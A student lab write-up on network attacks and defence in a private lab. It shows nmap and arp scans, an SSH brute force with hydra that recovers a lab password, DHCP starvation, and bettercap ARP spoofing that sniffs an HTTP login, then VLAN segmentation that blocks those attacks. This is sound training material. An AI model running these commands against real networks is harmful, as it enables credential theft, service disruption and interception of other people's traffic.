
# Discovery, interception and network protection

For this practical class, I simply use a kali on the network.

---

## Summary

1. [Scan](#Scan)
2. [Sniffing broadcast](#Sniffing-broadcast)
3. [Brute-force SSH](#Brute-force-SSH)
4. [Spoofing DHCP](#Spoofing-DHCP)
5. [Interception HTTP](#Interception-HTTP)
6. [Segmentation](#Segmentation)

---

## Scan

We begin by scanning our ethh0 interface using arp packets showing us multiple IP addresses :

```
sudo arp-scan --interface eth0 --localnet
Interface: eth0, type: EN10MB, MAC: bc:24:11:d6:65:a2, IPv4: 172.19.0.100
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.19.0.21     bc:24:11:c3:38:11       (Unknown)
172.19.0.22     bc:24:11:fb:f0:03       (Unknown)
172.19.0.254    bc:24:11:56:e8:c9       (Unknown)

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.983 seconds (129.10 hosts/sec). 3 responded
```

Now let's map the oppened ports on the same network :

<details>

<summary>nmap result</summary>

```
sudo nmap -sS -sV 172.19.0.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 08:01 EDT
Nmap scan report for 172.19.0.21
Host is up (0.000078s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: BC:24:11:C3:38:11 (Proxmox Server Solutions GmbH)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.19.0.22
Host is up (0.00020s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: BC:24:11:FB:F0:03 (Proxmox Server Solutions GmbH)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 172.19.0.254
Host is up (0.00023s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.8 (protocol 2.0)
443/tcp open  ssl/https
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port443-TCP:V=7.95%T=SSL%I=7%D=8/19%Time=68A467E5%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,251,"HTTP/1\.0\x20302\x20Moved\x20Temporarily\r\nDate:\x2
SF:0Tue,\x2019\x20Aug\x202025\x2012:02:45\x20GMT\r\nConnection:\x20Close\r
SF:\nLocation:\x20/admin\r\nCache-Control:\x20no-store,no-cache,must-reval
SF:idate\r\nPragma:\x20no-cache\r\nExpires:\x20-1\r\nLast-Modified:\x20Mon
SF:,\x2012\x20Jan\x202000\x2013:42:42\x20GMT\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nContent-Type:\x20text/html\r\n\r\n<html><head><title>Redire
SF:ction</title><meta\x20http-equiv=\"refresh\"\x20content=\"0;\x20url=/ad
SF:min\"><script\x20type=\"text/javascript\">function\x20redirect\(\){wind
SF:ow\.location\.href\x20=\x20'/admin';return\x20true;}</script></head><bo
SF:dy\x20onload=\"redirect\(\);\"><a\x20href=\"/admin\">Click\x20here,\x20
SF:if\x20you\x20are\x20not\x20redirected</a></body></html>")%r(HTTPOptions
SF:,1B1,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Tue,\x20
SF:19\x20Aug\x202025\x2012:02:45\x20GMT\r\nConnection:\x20Close\r\nCache-C
SF:ontrol:\x20no-store,no-cache,must-revalidate\r\nPragma:\x20no-cache\r\n
SF:Expires:\x20-1\r\nLast-Modified:\x20Mon,\x2012\x20Jan\x202000\x2013:42:
SF:42\x20GMT\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20tex
SF:t/html\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x20
SF:2\.0//EN\">\r\n<HTML><HEAD><TITLE>405\x20Method\x20Not\x20Allowed</TITL
SF:E></HEAD>\r\n<BODY><H1>Method\x20Not\x20Allowed</H1></BODY></HTML>")%r(
SF:FourOhFourRequest,196,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Tue
SF:,\x2019\x20Aug\x202025\x2012:02:45\x20GMT\r\nConnection:\x20Close\r\nCa
SF:che-Control:\x20no-store,no-cache,must-revalidate\r\nPragma:\x20no-cach
SF:e\r\nExpires:\x20-1\r\nLast-Modified:\x20Mon,\x2012\x20Jan\x202000\x201
SF:3:42:42\x20GMT\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x
SF:20text/html\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTM
SF:L\x202\.0//EN\">\r\n<HTML><HEAD><TITLE>404\x20Not\x20Found</TITLE></HEA
SF:D>\r\n<BODY><H1>Not\x20Found</H1></BODY></HTML>")%r(RTSPRequest,1BB,"HT
SF:TP/1\.0\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nConnection:\x2
SF:0Close\r\nContent-Type:\x20text/html\r\nX-Content-Type-Options:\x20nosn
SF:iff\r\nContent-Length:\x20175\r\nLast-Modified:\x20Mon,\x2012\x20Jan\x2
SF:02000\x2013:42:42\x20GMT\r\nExpires:\x20-1\r\nPragma:\x20no-cache\r\nCa
SF:che-Control:\x20no-store,no-cache,must-revalidate\r\n\r\n<!DOCTYPE\x20H
SF:TML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x202\.0//EN\">\r\n<HTML><HEAD><
SF:TITLE>505\x20HTTP\x20Version\x20Not\x20Supported</TITLE></HEAD>\r\n<BOD
SF:Y><H1>HTTP\x20Version\x20Not\x20Supported</H1></BODY></HTML>\r\n");
MAC Address: BC:24:11:56:E8:C9 (Proxmox Server Solutions GmbH)

Nmap scan report for 172.19.0.100
Host is up (0.000013s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (4 hosts up) scanned in 161.15 seconds
```

---

</details>

We can see multiple oppened ports on the few targets of the network. 
OpenSSh, Apache, windows RDP, and https.

---


## Sniffing broadcast

Now for a sniffing broadcast let's use tcpdump on our eth0 interface targetting packets such as arp, port 67(DHCP) and broadcast :

```sudo tcpdump -i eth0 arp or port 67 or broadcast```

And let's renew the IP address of the client targetted machine with ```sudo dhclient -v```.

In the meantime we can see our tcpdump sniffing collecting the datas :

```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
08:16:39.371148 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:fb:f0:03 (oui Unknown), length 300
08:16:39.372076 ARP, Request who-has 172.19.0.20 tell 172.19.0.254, length 28
08:16:39.423788 ARP, Request who-has 172.19.0.100 tell 172.19.0.254, length 28
08:16:39.423808 ARP, Reply 172.19.0.100 is-at bc:24:11:d6:65:a2 (oui Unknown), length 28
08:16:40.374078 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:fb:f0:03 (oui Unknown), length 300
08:16:41.394709 ARP, Request who-has 172.19.0.254 tell 172.19.0.20, length 28
```

We can see multiple request, with DHCP and ARP, and we can see a new address assigned at ```172.19.0.20```.
We can verify the new address by launching another arp-scan :

```
sudo arp-scan --interface eth0 --localnet
Interface: eth0, type: EN10MB, MAC: bc:24:11:d6:65:a2, IPv4: 172.19.0.100
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.19.0.20     bc:24:11:fb:f0:03       (Unknown)
172.19.0.21     bc:24:11:c3:38:11       (Unknown)
172.19.0.254    bc:24:11:56:e8:c9       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.843 seconds (138.90 hosts/sec). 3 responded
```

---


## Brute-force SSH

Now let's focus on the server target on 172.19.0.21, there is a SSH port openned so let's try brute-force it with hydra :

```
hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.21

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-19 08:41:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://172.19.0.21:22/
[STATUS] 191.00 tries/min, 191 tries in 00:01h, 14344216 to do in 1251:41h, 9 active
[22][ssh] host: 172.19.0.21   login: student   password: formation
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-19 08:44:18
```

Here is the result we wanted :

```[22][ssh] host: 172.19.0.21   login: student   password: formation```

Now we can use thoses logs to connect by SSH and get an access point in the server and see our flag :

```
student@debian:~$ cat /home/student/flag.txt
Compte:student_Pass:formation
```

---

## Spoofing DHCP

For DHCP spoofing we can use dhcpstarv in order to saturate the DHCP server with requests, causing clients usually served by DHCP to "starve", they simply can't communicate.

```sudo dhcpstarv -i eth0```

Here is the logs after :

```
08:57:12 08/19/25: no renewal time option in DHCPOFFER
08:57:12 08/19/25: got address 172.19.0.23 for 00:16:36:5f:73:f9 from 172.19.0.254
08:57:13 08/19/25: no renewal time option in DHCPOFFER
08:57:13 08/19/25: got address 172.19.0.24 for 00:16:36:ae:c9:d3 from 172.19.0.254
08:57:14 08/19/25: no renewal time option in DHCPOFFER
08:57:14 08/19/25: got address 172.19.0.25 for 00:16:36:b9:9b:4e from 172.19.0.254
08:57:15 08/19/25: no renewal time option in DHCPOFFER
08:57:15 08/19/25: got address 172.19.0.26 for 00:16:36:cf:cf:f5 from 172.19.0.254
08:57:16 08/19/25: no renewal time option in DHCPOFFER
08:57:16 08/19/25: got address 172.19.0.27 for 00:16:36:e2:22:cb from 172.19.0.254
08:57:17 08/19/25: no renewal time option in DHCPOFFER
08:57:17 08/19/25: got address 172.19.0.28 for 00:16:36:56:a5:bb from 172.19.0.254
08:57:18 08/19/25: no renewal time option in DHCPOFFER
08:57:18 08/19/25: got address 172.19.0.29 for 00:16:36:c0:19:dd from 172.19.0.254
08:57:19 08/19/25: no renewal time option in DHCPOFFER
08:57:19 08/19/25: got address 172.19.0.30 for 00:16:36:fa:28:05 from 172.19.0.254
```

Here we can see that the client user01 can't get a new address, now we can easily usurp the client by getting the address used by the client in order to intercept datas destined to it.
After cleaning my mess with thoses test I pass to the next attack.

---

## Interception HTTP

Let's check the arp table of user01 with ```ip neigh s``` :

<img width="953" height="110" alt="TP-arpTable1" src="https://github.com/user-attachments/assets/fc96f16e-ec72-4fa8-b650-2d35a2bfe0f7" />

Now let's use bettercap :
```sudo bettercap -iface eth0```

And now we must select our target for arp spoofing, activate net sniffing and launch our arp spoofing :

```
bettercap v2.33.0 (built for linux amd64 with go1.22.6) [type 'help' for a list of commands]

172.19.0.0/24 > 172.19.0.100  » [09:25:24] [sys.log] [inf] gateway monitor started ...
172.19.0.0/24 > 172.19.0.100  » set arp.spoof.targets 172.19.0.22
172.19.0.0/24 > 172.19.0.100  » net.sniff on
172.19.0.0/24 > 172.19.0.100  » [09:26:30] [sys.log] [inf] net.sniff starting net.recon as a requirement for net.sniff
172.19.0.0/24 > 172.19.0.100  » [09:26:30] [endpoint.new] endpoint 172.19.0.22 detected as bc:24:11:fb:f0:03 (Proxmox Server Solutions GmbH).
172.19.0.0/24 > 172.19.0.100  » arp.spoof on
[09:27:22] [sys.log] [inf] arp.spoof enabling forwarding
172.19.0.0/24 > 172.19.0.100  » [09:27:22] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
```

And here is the new arp table of user01 :

<img width="949" height="99" alt="TP-arpTable2" src="https://github.com/user-attachments/assets/d6cdd0f5-7c37-4aea-8083-192036e2f70f" />

Now let's try to test and log in with user01 machine on [vulnweb testing website](http://testphp.vulnweb.com/login.php).
Here we can log in with a simple test/test log to simulate a non-secure connexion HTTP where communications aren't encrypted.
Now let's see what happend in the meantime on our attacker machine, here is the logs of the sniff that pick my interest :

<img width="2103" height="610" alt="TP ARPspoofing" src="https://github.com/user-attachments/assets/556d6f62-09ea-45c7-8f57-14457b5ea203" />

Here we are, with logs put in red on the bottom so we can usurp them easily.

---

## Segmentation

Now we can segment our infrastructure, machines will be put in different VLANs and a stormshield firewall will filtrate communication between VLANs.
That can be usefull in order to put difficulties in the way of the cyber pirates, limiting their moves from a machine to another and by so blocking a lot of ways pirates use to do privilege escalation.
Here is the new attack results of the segmented network :


<details>

<summary>arp scan</summary>

```
sudo arp-scan --interface eth0 --localnet
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: bc:24:11:d6:65:a2, IPv4: 172.19.0.100
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.19.0.22     bc:24:11:fb:f0:03       (Unknown)
172.19.0.254    bc:24:11:56:e8:c9       (Unknown)

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.885 seconds (135.81 hosts/sec). 2 responded
```

Of course firstly, we can see only the client machine and not the server in our interface.

---

</details>


<details>

<summary>tcpdump</summary>

```
sudo tcpdump -i eth0 arp or port 67 or broadcast
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:54:31.639420 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:fb:f0:03 (oui Unknown), length 300
09:54:31.640667 ARP, Request who-has 172.19.0.20 tell 172.19.0.254, length 28
09:54:32.641754 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:fb:f0:03 (oui Unknown), length 300
```

With tcpdump, we still have some informations but only for the client machine that is still in our segment.

---

</details>


<details>

<summary>html interception</summary>

```
bettercap v2.33.0 (built for linux amd64 with go1.22.6) [type 'help' for a list of commands]

172.19.0.0/24 > 172.19.0.100  » [10:06:37] [sys.log] [inf] gateway monitor started ...
172.19.0.0/24 > 172.19.0.100  » set arp.spoof.targets 172.19.0.20
172.19.0.0/24 > 172.19.0.100  » net.sniff on
172.19.0.0/24 > 172.19.0.100  » [10:07:30] [sys.log] [inf] net.sniff starting net.recon as a requirement for net.sniff
172.19.0.0/24 > 172.19.0.100  » arp.spoof on
172.19.0.0/24 > 172.19.0.100  » [10:07:50] [sys.log] [war] arp.spoof could not find spoof targets
172.19.0.0/24 > 172.19.0.100  » [10:07:50] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
172.19.0.0/24 > 172.19.0.100  » [10:07:51] [sys.log] [war] arp.spoof could not find spoof targets
172.19.0.0/24 > 172.19.0.100  » [10:07:52] [sys.log] [war] arp.spoof could not find spoof targets
172.19.0.0/24 > 172.19.0.100  » [10:07:53] [sys.log] [war] arp.spoof could not find spoof targets
172.19.0.0/24 > 172.19.0.100  » [10:07:54] [sys.log] [war] arp.spoof could not find spoof targets
172.19.0.0/24 > 172.19.0.100  » [10:07:55] [sys.log] [war] arp.spoof could not find spoof targets
172.19.0.0/24 > 172.19.0.100  » [10:07:56] [sys.log] [war] arp.spoof could not find spoof targets
172.19.0.0/24 > 172.19.0.100  » [10:07:57] [sys.log] [war] arp.spoof could not find spoof targets
172.19.0.0/24 > 172.19.0.100  » [10:07:58] [sys.log] [war] arp.spoof could not find spoof targets
```

And for the html interception, the target is simply not found.

---

</details>

